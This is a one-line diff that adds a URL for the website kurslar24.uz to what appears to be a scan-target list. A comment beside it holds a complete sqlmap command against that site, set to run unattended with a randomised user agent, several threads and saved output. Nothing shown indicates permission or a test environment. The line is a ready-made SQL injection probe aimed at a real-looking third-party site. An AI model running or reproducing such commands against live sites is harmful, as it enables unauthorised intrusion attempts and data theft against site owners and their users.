@@ -1,0 +1,1 @@
+http://kurslar24.uz (GET)  # tools/sqlmap/sqlmap.py -u http://kurslar24.uz --batch --random-agent --level=1 --risk=1 --threads=3 --timeout=30 --smart --output-dir=scan_results
